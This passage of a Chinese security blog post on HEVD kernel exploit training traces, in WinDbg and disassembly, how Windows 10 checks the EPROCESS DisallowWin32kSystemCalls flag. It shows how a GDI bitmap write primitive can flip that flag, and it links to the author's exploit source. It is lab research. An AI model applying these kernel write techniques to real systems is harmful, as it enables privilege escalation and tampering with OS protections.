&nbsp;&nbsp;&nbsp;+0x000&nbsp;Header&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_DISPATCHER_HEADER
&nbsp;&nbsp;&nbsp;+0x010&nbsp;SListFaultAddress&nbsp;:&nbsp;(null)
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x2c://ecx获得EPROCESS结构
81b0c6a2&nbsp;8b8e80000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[esi+80h]
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x32://对应Flags2的偏移
81b0c6a8&nbsp;f781c000000000000080&nbsp;test&nbsp;dword&nbsp;ptr&nbsp;[ecx+0C0h],80000000h
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;Flags2&nbsp;8548b040+70
&nbsp;&nbsp;&nbsp;+0x0c0&nbsp;Flags2&nbsp;:&nbsp;0x1020201
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;DisallowWin32kSystemCalls
&nbsp;&nbsp;&nbsp;+0x0c0&nbsp;DisallowWin32kSystemCalls&nbsp;:&nbsp;0y0//判断Disallow比特位的值</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这里DisallowWin32kSystemCalls的比特位为0，也就是允许win32k调用，这里到达一处条件判断，判断的就是这个比特位，如果为1，则会跳转返回C0000005，当前状态为0，允许执行时，会继续执行。</span><br/></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x3c:
81b0c6b2&nbsp;757e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!PsConvertToGuiThread+0xbc&nbsp;(81b0c732)
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x3e:
81b0c6b4&nbsp;8d55ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,[ebp-1]</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">接下来，我们注释掉还原的setbitmap部分，重新执行，看到Disallow比特位为1，这时候程序会进入错误处理，返回C0000022</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;DisallowWin32kSystemCalls&nbsp;866654c0
&nbsp;&nbsp;&nbsp;+0x0c0&nbsp;DisallowWin32kSystemCalls&nbsp;:&nbsp;0y1//对应比特位为1
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x32:
81b0c6a8&nbsp;f781c000000000000080&nbsp;test&nbsp;dword&nbsp;ptr&nbsp;[ecx+0C0h],80000000h
//判断Flags2.DisallowedWin32kSystemCalls
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0x3c:
81b0c6b2&nbsp;757e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt!PsConvertToGuiThread+0xbc&nbsp;(81b0c732)
kd&gt;&nbsp;p
nt!PsConvertToGuiThread+0xbc:
81b0c732&nbsp;b8220000c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,0C0000022h&nbsp;&nbsp;&nbsp;//进入错误判断，返回C0000022</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">来看下这段代码逻辑。</span></p><p><br/></p><pre class="brush:bash;toolbar:false">signed&nbsp;int&nbsp;__stdcall&nbsp;PsConvertToGuiThread()
{
&nbsp;&nbsp;v0&nbsp;=&nbsp;__readfsdword(292);//获取_KTHREAD结构体
&nbsp;&nbsp;if&nbsp;(&nbsp;*(_BYTE&nbsp;*)(v0&nbsp;+&nbsp;346)&nbsp;)//判断_KTHREAD结构体的Previous&nbsp;Mode
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(int&nbsp;**)(v0&nbsp;+&nbsp;60)&nbsp;==&nbsp;&amp;KeServiceDescriptorTable&nbsp;)//检查是否是win32的线程
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;*(_DWORD&nbsp;*)(v0&nbsp;+&nbsp;128);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)(v1&nbsp;+&nbsp;192)&nbsp;&amp;&nbsp;0x80000000&nbsp;)//判断DisallowedWin32kSystemCalls
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;0xC000022;//返回C000022&nbsp;STATUS_ACCESS_DENIED
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">整个Win32k的检查过程是这样的，KiFastCallEntry -&gt; KiEndUnexpectRange -&gt; PsCovertToGUIThread。这个检查过程的依据是SSDT，系统调度表，当调用不在SSDT表时，也就是第一次调用Win32k System Call的时候，会检查win32k是否允许调用。如下代码逻辑：</span></p><pre class="brush:bash;toolbar:false">.text:00511652&nbsp;loc_511652:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;_KiEndUnexpectedRange+15j
.text:00511652&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;_KiSystemService+8Aj
.text:00511652&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;eax&nbsp;;eax&nbsp;=&nbsp;SSDTIndex
.text:00511654&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;8;eax/256
.text:00511657&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;10h;//SSDT&nbsp;or&nbsp;SSDTShadow
.text:0051165A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;edi
.text:0051165C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;[esi+3Ch];//检查_KTHREAD-&gt;ServiceTable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;ServiceTable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//+0x03c&nbsp;ServiceTable&nbsp;:&nbsp;Ptr32&nbsp;Void
.text:0051165F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,&nbsp;eax
.text:00511661&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;0FFFh
.text:00511666&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edi+8];//检查当前系统调用号
//和ServiceTable中的调用号，确定是不是在SSDT
.text:00511669&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_KiEndUnexpectedRange//如果不在，则跳转</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在KiEndUnexpectedRange中会通过PsConvertToGuiThread来Check状态，在这里会检查win32k系统调用的情况，如果Flags2.DisAllowedWin32kSystemCalls为1，则禁用状态，返回C000022 ，也就是STATUS_ACCESS_DENIED</span><br/></p><pre class="brush:bash;toolbar:false">.text:00511384&nbsp;_KiEndUnexpectedRange&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;_KiSystemService+19B_x0019_j
.text:00511384&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;10h
.text:00511387&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_5113C3
.text:00511389&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edx
.text:0051138A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx//系统调用号
.text:0051138B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;_PsConvertToGuiThread@0&nbsp;;&nbsp;PsConvertToGuiThread()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">默认是不启用的，则能成功打开cmd。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p0.qhimg.com/t0107981ff3e166205b.png" title="t011ffe029f3cd35a57.png" alt="http://p9.qhimg.com/t011ffe029f3cd35a57.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">我们通过setbitmap可以将其改为启用，这样PsConvertToGuiThread就会返回C000022，则后续会造成调用CreateProcess中由于禁用win32k.sys导致程序加载失败。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p3.qhimg.com/t01a2a8e12dd0f24ad0.png" title="t01e36f58f277b2c9ad.png" alt="http://p5.qhimg.com/t01e36f58f277b2c9ad.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">其实整个HEVD的这个exploit调试还是很有趣的，Bitmap也可以修改kernel Address达到一些比较巧妙的效果，当然，如果修改的地址有问题，则会直接BSOD，我就多次发生这样的情况，快照保存了几十个。文中有一些疑问和思考不够深入的地方请师傅们多多批评指正，谢谢大家！</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">超级好文：</span></strong><a href="https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf" style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf</a></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">文中改写源码地址：</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;"><a href="https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Win10&Win8" _src="https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Win10&Win8">https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Win10&amp;Win8</a></span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3544.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】HEVD内核漏洞训练——陪Windows玩儿 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3544" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12077" user-name="evan的家" href="javascript:;">
                evan的家            </a>
                        <span class="comment-time">2017-03-02 09:50:40</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12077">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12077" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_:之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01386b81c31e58d8dd.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="281844381" class="response" data-bind-id="281844381" data-target="12073" user-name="anykno" href="javascript:;">
                anykno            </a>
                        <span class="comment-time">2017-03-01 16:50:36</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="281844381" data-target="12073">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12073" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">sssss</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12062" user-name="_等一分钟" href="javascript:;">
                _等一分钟            </a>
                        <span class="comment-time">2017-02-28 22:10:47</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12062">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12062" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@我的印象笔记 6的不行不行的。//@linkerrors://@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12061" user-name="_等一分钟" href="javascript:;">
                _等一分钟            </a>
                        <span class="comment-time">2017-02-28 22:10:41</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12061">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12061" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@我的印象笔记 6的不行不行的。//@linkerrors://@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12059" user-name="linkerrors" href="javascript:;">
                linkerrors            </a>
                        <span class="comment-time">2017-02-28 21:00:37</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12059">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12059" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12058" user-name="wj2ge" href="javascript:;">
                wj2ge            </a>
                        <span class="comment-time">2017-02-28 21:00:37</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12058">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12058" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@linkerrors://@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12057" user-name="夏侯爺當家" href="javascript:;">
                夏侯爺當家            </a>
                        <span class="comment-time">2017-02-28 20:40:39</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12057">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12057" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@老实敦厚的大宝://@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12056" user-name="老实敦厚的大宝" href="javascript:;">
                老实敦厚的大宝            </a>
                        <span class="comment-time">2017-02-28 19:50:36</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12056">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12056" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_: 之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12055" user-name="" href="javascript:;">
                            </a>
                        <span class="comment-time">2017-02-28 19:30:36</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12055">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12055" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_:之前看了偶像MJ0011在HITCON上一篇关于win8防护机制的ppt，非常想利用bitmap再来尝试一下，没想到在win10踩了茫茫多的坑，一个星期被吊打感觉很兴奋，与大家分享，师傅们多多指教</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12054" user-name="我叫0day谁找我_" href="javascript:;">
                我叫0day谁找我_            </a>
                        <span class="comment-time">2017-02-28 18:40:39</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12054">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12054" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">回复@薛定鄂的鄂:寡欲？</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3544" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
